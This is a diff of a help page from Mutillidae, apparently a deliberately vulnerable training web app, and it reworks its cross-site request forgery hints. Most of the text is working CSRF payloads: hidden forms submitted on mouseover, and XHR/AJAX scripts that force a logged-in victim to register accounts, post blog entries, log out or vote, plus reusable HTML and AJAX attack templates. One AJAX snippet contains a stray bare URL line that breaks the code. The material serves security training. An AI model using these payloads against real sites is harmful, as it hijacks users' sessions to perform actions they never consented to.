@@ -73,18 +73,16 @@ Referer: http://mutillidae/index.php?page=register.php
 Cookie: PHPSESSID=1a28b85b825be0e5c9dc2789c63a3b44
 Content-Type: application/x-www-form-urlencoded
 Content-Length: 122
-
 <span class="important-code">
 username=username1&amp;;password=pass1&amp;confirm_password=pass1&amp;my_signature=signature1&amp;register-php-submit-button=Create+Account
 </span>
 </code>
-			<br/><br/>
+			<br/>
 			Note the method, action, and input parameters. Use the CSRF template to create an HTML form injection
 			that can send this request. Here is an example to create a user "sammy" with password "samurai".
-			<br/><br/>
+			<br/>
 <code>
 &lt;!--/*
-People often ask &quot;What is the password for samurai?&quot;. The answer is below.
 Be careful to escape single-quotes if inserting into MySQL. 
 This example has the single quotes MySQL escaped (&#39; -&gt; \&#39;).
 The try/catch is just to help you debug. This is not intended 
@@ -100,64 +98,16 @@ is going to be notified.
 &lt;/form&gt;
 &lt;span onmouseover=&quot;try{var lURL=document.location.href;document.getElementById(\&#39;CSRF\&#39;).submit();document.location.href=lURL;}catch(e){alert(e.message);}&quot;&gt;Hello World&lt;/span&gt;
 </code>
-				<br/><br/>
-				On the Add to your Blog page (http://mutillidae/index.php?page=add-to-your-blog.php), 
-				inject this exploit as a new blog. On either the Add Blog or the View Blog page, carefully 
-				mouseover the blog text and watch for the page to reload. Try to log in with the new user. Trap requests with an
-				interception proxy like Burp to watch the actual request. Submit the request with XHR to get rid
-				of that pesky page reload which could alert the user. When using XHR, use an interception
-				proxy to watch the request and the response. Otherwise you wont notice.
-				<br/><br/>
-				Here is the same example using XHR rather than the &quot;onmouseover&quot; event:
-				<br/><br/>
-<code>
-&lt;script&gt;
-	var lXMLHTTP;
-	try{
-		var lData = &quot;username=fred&amp;password=pass&amp;confirm_password=pass&amp;my_signature=signature1&amp;register-php-submit-button=Create+Account&quot;;
-		var lAction = &quot;/index.php?page=register.php&quot;;
-		var lMethod = &quot;POST&quot;;
-		try {
-			lXMLHTTP = new ActiveXObject(&quot;Msxml2.XMLHTTP&quot;);
-		}catch (e) { 
-			try {
-				lXMLHTTP = new ActiveXObject(&quot;Microsoft.XMLHTTP&quot;);
-			}catch (e) {
-				try {
-					lXMLHTTP = new XMLHttpRequest();
-				}catch (e) {
-					alert(e.message);//THIS LINE IS TESTING AND DEMONSTRATION ONLY. DO NOT INCLUDE IN PEN TEST.
-				}
-			}
-		}//end try
-		lXMLHTTP.onreadystatechange = function(){
-			if(lXMLHTTP.readyState == 4){
-				alert(&quot;CSRF Complete&quot;);//THIS LINE IS TESTING AND DEMONSTRATION ONLY. DO NOT INCLUDE IN PEN TEST.
-			}
-		}
-		/////////////////////////////
-		//UNCOMMENT FOR GET REQUESTS
-		/////////////////////////////
-		//xmlhttp.open(lMethod, lAction, true);
-		//lData=&quot;&quot;;
-		/////////////////////////////
-
-		/////////////////////////////
-		//UNCOMMENT FOR POST REQUESTS
-		/////////////////////////////
-		lXMLHTTP.open(lMethod, lAction, true);
-		lXMLHTTP.setRequestHeader(&quot;Method&quot;, &quot;POST &quot; + lAction + &quot; HTTP/1.1&quot;);
-		lXMLHTTP.setRequestHeader(&quot;Content-Type&quot;, &quot;application/x-www-form-urlencoded&quot;);
-		/////////////////////////////
-		
-		lXMLHTTP.send(lData);
-	}catch(e){
-		alert(e.message);//THIS LINE IS TESTING AND DEMONSTRATION ONLY. DO NOT INCLUDE IN PEN TEST.
-	}
-&lt;/script&gt;
-</code>
-<br/><br/>
-			Force someone to add a blog without consent:
+			<br/>
+			On the Add to your Blog page (http://mutillidae/index.php?page=add-to-your-blog.php), 
+			inject this exploit as a new blog. On either the Add Blog or the View Blog page, carefully 
+			mouseover the blog text and watch for the page to reload. Try to log in with the new user. Trap requests with an
+			interception proxy like Burp to watch the actual request. Submit the request with XHR to get rid
+			of that pesky page reload which could alert the user. When using XHR, use an interception
+			proxy to watch the request and the response. Otherwise you wont notice.
+			<br/><br/>
+			<span class="report-header">Example: Force someone to add a blog - HTML Event Injection</span>
+			<br/><br/>
 <code>
 &lt;form id=&quot;f&quot; action=&quot;index.php?page=add-to-your-blog.php&quot; method=&quot;post&quot; enctype=&quot;application/x-www-form-urlencoded&quot;&gt;
 &lt;input type=&quot;hidden&quot; name=&quot;csrf-token&quot; value=&quot;best-guess&quot;/&gt;
@@ -167,13 +117,14 @@ is going to be notified.
 &lt;i onmouseover=&quot;window.document.getElementById(\&#39;f\&#39;).submit()&quot;&gt;Dancing with the stars results&lt;/i&gt;
 </code>
 			<br/><br/>
-			Force someone to log out:
+			<span class="report-header">Example: Force someone to log out - HTML Event Injection</span>
+    		<br/><br/>
 <code>
 &lt;i onmouseover=&quot;window.document.location=\&#39;http://localhost/mutillidae/index.php?do=logout\&#39;&quot;&gt;How to improve your Facebook status&lt;/i&gt;
 </code>
 			<br/><br/>
-			Force someone to add a blog without consent using HTML injection:
-			<br/>
+			<span class="report-header">Example: Force someone to add a blog - HTML injection</span>
+    		<br/><br/>
 <code>
 &lt;script&gt;
 	var f = document.createElement(&quot;form&quot;);
@@ -202,8 +153,50 @@ is going to be notified.
 	f.submit();
 &lt;/script&gt;
 </code>
-			<br/>
-			Force someone to register without their consent using a silent AJAX request:
+			<br/><br/>
+			<span class="report-header">Example: Force someone to add a blog - AJAX</span>
+    		<br/><br/>
+<code>
+&lt;script&gt;
+	var lXMLHTTP; 
+	try{
+		var lBlogEntry = encodeURI(&quot;BLOG_ENTRY_GOES_HERE&quot;);
+		
+		var lData = &quot;csrf-token=&amp;blog_entry=&quot;+lBlogEntry+&quot;&amp;add-to-your-blog-php-submit-button=Save+Blog+Entry&quot;;
+		var lAction = &quot;./index.php?page=add-to-your-blog.php&quot;;
+		var lMethod = &quot;POST&quot;;
+
+		try {
+			lXMLHTTP = new ActiveXObject(&quot;Msxml2.XMLHTTP&quot;);
+		}catch(e){ 
+			try {
+				lXMLHTTP = new ActiveXObject(&quot;Microsoft.XMLHTTP&quot;);
+			}catch(e){
+				try{
+					lXMLHTTP = new XMLHttpRequest();
+				}catch(e){
+					alert(e.message);
+				}
+			}
+		}
+
+		lXMLHTTP.onreadystatechange = function(){
+			if(lXMLHTTP.readyState == 4){
+				alert(&quot;CSRF Complete&quot;);
+			}
+		};
+		
+		lXMLHTTP.open(lMethod, lAction, true);
+		lXMLHTTP.setRequestHeader(&quot;Content-Type&quot;, &quot;application/x-www-form-urlencoded&quot;);
+		lXMLHTTP.send(lData);
+	}catch(e){
+		alert(e.message);
+	}
+&lt;/script&gt;
+</code>
+			<br/><br/>
+			<span class="report-header">Example: Force someone to register an account - AJAX</span>
+    		<br/><br/>
 <code>
 &lt;script&gt;
 	var lXMLHTTP; 
@@ -224,14 +217,14 @@ is going to be notified.
 				try{
 					lXMLHTTP = new XMLHttpRequest();
 				}catch(e){
-					alert(e.message);//THIS LINE IS TESTING AND DEMONSTRATION ONLY. DO NOT INCLUDE IN PEN TEST.
+					alert(e.message);
 				}
 			}
-		}//end try
+		}
 
 		lXMLHTTP.onreadystatechange = function(){
 			if(lXMLHTTP.readyState == 4){
-				alert(&quot;CSRF Complete&quot;);//THIS LINE IS TESTING AND DEMONSTRATION ONLY. DO NOT INCLUDE IN PEN TEST.
+				alert(&quot;CSRF Complete&quot;);
 			}
 		};
 		
@@ -239,12 +232,99 @@ is going to be notified.
 		lXMLHTTP.setRequestHeader(&quot;Content-Type&quot;, &quot;application/x-www-form-urlencoded&quot;);
 		lXMLHTTP.send(lData);
 	}catch(e){
-		alert(e.message);//THIS LINE IS TESTING AND DEMONSTRATION ONLY. DO NOT INCLUDE IN PEN TEST.
+		alert(e.message);
+	}
+&lt;/script&gt; 
+</code>
+			<br/><br/>
+			<span class="report-header">Example: Force someone to vote for NMap - HTML injection</span>
+    		<br/><br/>
+<code>
+&lt;script&gt;
+function sendcsrf(){
+	var lForm = document.createElement("FORM");
+	lForm.action="http://mutillidae/index.php";
+	lForm.method = "GET";
+	lForm.enctype="application/x-www-form-urlencoded";
+	document.body.appendChild(lForm);
+
+	var lPage = document.createElement("INPUT");
+	lPage.setAttribute("name", "page");
+	lPage.setAttribute("type", "hidden");
+	lPage.setAttribute("value", "user-poll.php");
+	lForm.appendChild(lPage);
+
+	var lCSRFToken = document.createElement("INPUT");
+	lCSRFToken.setAttribute("name", "csrf-token");
+	lCSRFToken.setAttribute("type", "hidden");
+	lCSRFToken.setAttribute("value", "");
+	lForm.appendChild(lCSRFToken);
+	var lChoice = document.createElement("INPUT");
+	lChoice.setAttribute("name", "choice");
+	lChoice.setAttribute("type", "hidden");
+	lChoice.setAttribute("value", "nmap");
+	lForm.appendChild(lChoice);
+
+	var lInitials = document.createElement("INPUT");
+	lInitials.setAttribute("name", "initials");
+	lInitials.setAttribute("type", "hidden");
+	lInitials.setAttribute("value", "JD");
+	lForm.appendChild(lInitials);
+
+	var lButton = document.createElement("INPUT");
+	lButton.setAttribute("name", "user-poll-php-submit-button");
+	lButton.setAttribute("type", "hidden");
+	lButton.setAttribute("value", "Submit Vote");
+	lForm.appendChild(lButton);
+
+	lForm.submit();
+}
+&lt;/script&gt;
+&lt;span onmouseover="sendcsrf();"&gt;Vote for nmap. I know you will.&lt;/span&gt;
+</code>
+			<br/><br/>
+			<span class="report-header">Example: Force someone to vote for NMap - AJAX</span>
+    		<br/><br/>
+<code>
+&lt;script&gt;
+	var lXMLHTTP; 
+	try{
+		var lData = &quot;&quot;;
+		var lAction = &quot;./index.php?page=user-poll.php&amp;csrf-token=&amp;choice=nmap&amp;initials=CSRF&amp;user-poll-php-submit-button=Submit+Vote&quot;;
+		http://mutillidae/index.php?
+		
+		var lMethod = &quot;GET&quot;;
+
+		try {
+			lXMLHTTP = new ActiveXObject(&quot;Msxml2.XMLHTTP&quot;);
+		}catch(e){ 
+			try {
+				lXMLHTTP = new ActiveXObject(&quot;Microsoft.XMLHTTP&quot;);
+			}catch(e){
+				try{
+					lXMLHTTP = new XMLHttpRequest();
+				}catch(e){
+					alert(e.message);
+				}
+			}
+		}
+
+		lXMLHTTP.onreadystatechange = function(){
+			if(lXMLHTTP.readyState == 4){
+				alert(&quot;CSRF Complete&quot;);
+			}
+		};
+		
+		lXMLHTTP.open(lMethod, lAction, true);
+		lXMLHTTP.setRequestHeader(&quot;Content-Type&quot;, &quot;application/x-www-form-urlencoded&quot;);
+		lXMLHTTP.send();
+	}catch(e){
+		alert(e.message);
 	}
 &lt;/script&gt; 
 </code>
 <br/><br/>
-<span class="report-header">Appendix - CSRF Templates</span>
+<span class="report-header">Appendix - CSRF Template - HTML Form</span>
 <br/><br/>
 <code>
 /* HTML Injection based CSRF template */
@@ -276,7 +356,11 @@ If injecting into JavaScript context, do not include script tags. */
    	window.document.appendChild(lCSRFForm);
    	lCSRFForm.submit();
 &lt;/script&gt;
-
+</code>
+<br/><br/>
+<span class="report-header">Appendix - CSRF Template - AJAX</span>
+<br/><br/>
+<code>
 &lt;script&gt;
 	var lXMLHTTP;
 	try{
@@ -292,13 +376,13 @@ If injecting into JavaScript context, do not include script tags. */
 				try {
 					lXMLHTTP = new XMLHttpRequest();
 				}catch (e) {
-					alert(e.message);//THIS LINE IS TESTING AND DEMONSTRATION ONLY. DO NOT INCLUDE IN PEN TEST.
+					alert(e.message);
 				}
 			}
-		}//end try
+		}
 		lXMLHTTP.onreadystatechange = function(){
 			if(lXMLHTTP.readyState == 4){
-				alert(&quot;CSRF Complete&quot;);//THIS LINE IS TESTING AND DEMONSTRATION ONLY. DO NOT INCLUDE IN PEN TEST.
+				alert(&quot;CSRF Complete&quot;);
 			}
 		}
 		/////////////////////////////
@@ -316,7 +400,7 @@ If injecting into JavaScript context, do not include script tags. */
 		lXMLHTTP.setRequestHeader(&quot;Content-Type&quot;, &quot;application/x-www-form-urlencoded&quot;);
 		lXMLHTTP.send(lData);
 	}catch(e){
-		alert(e.message);//THIS LINE IS TESTING AND DEMONSTRATION ONLY. DO NOT INCLUDE IN PEN TEST.
+		alert(e.message);
 	}
 &lt;/script&gt;
 </code>
